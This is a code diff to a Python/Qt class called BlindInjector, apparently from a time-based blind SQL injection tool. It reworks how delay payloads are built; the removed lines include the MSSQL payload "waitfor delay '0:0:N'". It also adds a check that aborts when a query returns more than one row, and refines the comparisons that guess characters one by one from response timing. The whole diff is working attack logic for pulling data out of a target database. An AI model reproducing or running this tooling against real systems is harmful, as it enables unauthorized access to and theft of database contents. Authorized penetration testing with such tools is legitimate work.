@@ -441,13 +441,15 @@ class BlindInjector(QtCore.QThread):
    
     #Testing for optimal delay
     def delayTest(self):
-        testLog = "Base / Delayed (0:0:" + str(self.vars['delay']) + ")\n\n"
+        testLog = "Base / Delayed (0:0:" + str(self.vars['time']) + ")\n\n"
         response = self.wq.httpRequest("", False, self.vars, True)
+        query = self.wq.buildQuery(self.blindType('delay'), self.vars, {'delay' : str(self.vars['time'])})
+        print(query)
         for resp in range(3):
             response = self.wq.httpRequest("", False, self.vars, True)
             self.verbose(None, {'rdata' : "Empty",  'rtime' : str(response)})
             testLog += str(response) + " (" + str(core.txtproc.roundTime(response)) + " sec) / "
-            response = self.wq.httpRequest("waitfor delay '0:0:" + str(self.vars['delay']) + "'", False, self.vars, True)
+            response = self.wq.httpRequest(query, False, self.vars, True)
             self.verbose(None, {'rdata' : "Empty",  'rtime' : str(response)})
             testLog += str(response) + " (" + str(core.txtproc.roundTime(response)) + " sec)\n"
             self.querySignal.emit(testLog, False)
@@ -474,13 +476,24 @@ class BlindInjector(QtCore.QThread):
         start_time = time.time()
         
         response = self.wq.httpRequest("", False, self.vars, True)
-        query = "waitfor delay '0:0:" + str(self.vars['delay']) + "'"
+        query = self.wq.buildQuery(self.blindType('delay'), self.vars, {'delay' : str(self.vars['time'])})
         for i in range(2):
             self.verbose(query)
             response = self.wq.httpRequest(query, False, self.vars, True)
             self.verbose(None, {'rdata' : "Empty",  'rtime' : str(response)})
         self.response = core.txtproc.roundTime(response)
-
+        
+        #Rows count check. If more than 1 row - aborting.
+        if "count(*)" not in self.vars['query_cmd'].lower():
+            if "from" in self.vars['query_cmd'].lower():
+                self.mode = "count"
+                if self.preCheck():
+                    if self.delayed("between 50 and 57"):
+                        self.querySignal.emit("Query returned more than 1 row.", True)
+                        return
+                
+        self.mode = "single"
+        
         while not (self.string_fetched or self.killed):
             if self.preCheck():
                 symbol_found = self.getSymbol()
@@ -497,6 +510,7 @@ class BlindInjector(QtCore.QThread):
                         + str(self.response ) + ")!!!: Retry #"+ str(retry_counter))
                         time.sleep(5)
                 self.querySignal.emit(self.symbol, True)
+                
         seconds = str(time.time() - start_time).split('.')
         elapsed = str(datetime.timedelta(seconds=int(seconds[0])))
         self.logSignal.emit("Total requests sent: " + str(self.request_counter) + "\nElapsed time: " + elapsed)
@@ -535,7 +549,7 @@ class BlindInjector(QtCore.QThread):
             self.algorythm("other")
             return True          
         return False
-
+        
     def preCheck(self):
         #Checking for valid response
         if not self.delayed("between 9 and 127"):
@@ -548,11 +562,15 @@ class BlindInjector(QtCore.QThread):
             self.symbol = "NULL"
             return False
         return True
-        
+
     #If delay occurred
     def delayed(self, condition):
-        query = self.wq.buildQuery(self.blindType('single_row'), self.vars,\
-                                   {'symbol_num' : str(self.symbol_num), 'condition' : " " + condition, 'delay' : str(self.vars['delay'])})
+        if self.mode == "single":
+            query = self.wq.buildQuery(self.blindType('single_row'), self.vars,\
+                                        {'symbol_num' : str(self.symbol_num), 'condition' : " " + condition, 'delay' : str(self.vars['time'])})
+        else:
+            query = self.wq.buildQuery(self.blindType('rows_count'), self.vars,\
+                                        {'symbol_num' : str(self.symbol_num), 'condition' : " " + condition, 'delay' : str(self.vars['time'])})
         if self.vars['method'] == "POST":
             query = query.replace("=", "[eq]")
         self.verbose(query)
@@ -636,16 +654,16 @@ class BlindInjector(QtCore.QThread):
 
         elif mode == "numbers":
             #6, 7, 8, 9
-            if self.delayed("> 55"):
-                if self.delayed("> 56"):
-                    self.retSymbol(57)
-                else:
-                    self.retSymbol(56)
+            if self.delayed("> 56"):
+                self.retSymbol(57)
             else:
-                if self.delayed("> 54"):
-                    self.retSymbol(55)
+                if self.delayed("> 55"):
+                    self.retSymbol(56)
                 else:
-                    self.retSymbol(54)
+                    if self.delayed("> 54"):
+                        self.retSymbol(55)
+                    else:
+                        self.retSymbol(54)
             return True
             
         elif mode == "spec_1":
